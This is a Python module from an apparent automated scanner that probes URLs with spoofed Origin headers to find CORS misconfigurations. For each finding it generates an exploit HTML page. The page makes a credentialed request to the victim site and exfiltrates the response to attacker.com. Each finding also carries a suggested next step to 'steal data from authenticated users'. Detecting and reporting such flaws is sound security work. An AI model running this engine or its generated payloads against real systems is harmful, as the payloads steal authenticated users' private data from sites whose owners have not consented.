"""
Phase 2 (Additional) - CORS Detection & Exploitation Engine
Detects and proves CORS misconfigurations with auto-generated PoC.
"""
import asyncio
import httpx
from typing import List, Dict, Optional
from urllib.parse import urlparse


# Origins to test for reflection
TEST_ORIGINS = [
    "https://evil.com",
    "https://attacker.com",
    "null",
    "https://evil.{domain}",          # Trust of parent domain wildcard
    "https://not{domain}",            # Partial-match bypass
    "https://{domain}.attacker.com",  # Suffix bypass
    "https://sub.{domain}",           # Subdomain trust
]


class CORSEngine:
    def __init__(self, timeout: int = 10):
        self.timeout = timeout

    async def test_url(self, url: str) -> List[Dict]:
        """Test a URL for CORS misconfigurations."""
        parsed = urlparse(url)
        domain = parsed.netloc
        findings = []

        origins_to_test = [
            o.replace("{domain}", domain) for o in TEST_ORIGINS
        ]

        async with httpx.AsyncClient(verify=False, timeout=self.timeout, follow_redirects=True) as client:
            for origin in origins_to_test:
                try:
                    resp = await client.get(
                        url,
                        headers={
                            "Origin": origin,
                            "User-Agent": "Mozilla/5.0",
                        }
                    )
                    acao  = resp.headers.get("Access-Control-Allow-Origin", "")
                    acac  = resp.headers.get("Access-Control-Allow-Credentials", "").lower()
                    acam  = resp.headers.get("Access-Control-Allow-Methods", "")

                    # No CORS headers at all → not vulnerable
                    if not acao:
                        continue

                    # Wildcard with credentials (invalid per spec but some servers do it)
                    if acao == "*" and acac == "true":
                        findings.append(self._make_finding(
                            url, origin, acao, acac, acam,
                            vuln_type="Wildcard + Credentials (Invalid Config)",
                            severity="high", confidence=0.95,
                        ))

                    # Our origin is reflected AND credentials allowed
                    elif acao == origin and acac == "true":
                        findings.append(self._make_finding(
                            url, origin, acao, acac, acam,
                            vuln_type="CORS: Arbitrary Origin Reflected + Credentials",
                            severity="critical", confidence=0.95,
                        ))

                    # Origin reflected but NO credentials — still an info-level issue
                    elif acao == origin:
                        findings.append(self._make_finding(
                            url, origin, acao, acac, acam,
                            vuln_type="CORS: Arbitrary Origin Reflected (No Credentials)",
                            severity="low", confidence=0.80,
                        ))

                    # null origin accepted with credentials
                    elif origin == "null" and acao == "null" and acac == "true":
                        findings.append(self._make_finding(
                            url, origin, acao, acac, acam,
                            vuln_type="CORS: Null Origin + Credentials",
                            severity="high", confidence=0.90,
                        ))

                except Exception:
                    pass

        # Deduplicate by URL + type
        seen = set()
        unique = []
        for f in findings:
            key = f["url"] + f["type"]
            if key not in seen:
                seen.add(key)
                unique.append(f)
        return unique

    def _make_finding(self, url, origin, acao, acac, acam, vuln_type, severity, confidence) -> Dict:
        poc = self._generate_poc(url, origin, acac == "true")
        return {
            "type": vuln_type,
            "url": url,
            "tested_origin": origin,
            "acao_header": acao,
            "acac_header": acac,
            "acam_header": acam,
            "severity": severity,
            "confidence": confidence,
            "evidence": f"Origin: {origin} → Access-Control-Allow-Origin: {acao}, Credentials: {acac}",
            "exploit_poc": poc,
            "suggested_next_step": "Use the generated PoC to steal data from authenticated users",
        }

    def _generate_poc(self, target_url: str, origin: str, with_credentials: bool) -> str:
        """Auto-generate exploit HTML for confirmed CORS bug."""
        cred_flag = "true" if with_credentials else "false"
        return f"""<!-- CORS PoC — Host this on your server ({origin}) -->
<script>
fetch('{target_url}', {{
  method: 'GET',
  credentials: '{('include' if with_credentials else 'omit')}',
}})
.then(r => r.text())
.then(data => {{
  // Exfiltrate to attacker server
  fetch('https://attacker.com/log?data=' + encodeURIComponent(data));
}});
</script>"""

    async def scan(self, assets: List[Dict]) -> List[Dict]:
        """Scan all live endpoints for CORS issues — STRICTLY SEQUENTIAL."""
        all_findings = []

        # Focus on API, page, and authenticated-looking endpoints
        targets = [
            a for a in assets
            if a.get("status_code") in [200, 201, 204]
            and a.get("type") in ["api", "graphql", "page", "endpoint"]
        ]

        for asset in targets:
            res = await self.test_url(asset["url"])
            all_findings.extend(res)
            
        return all_findings
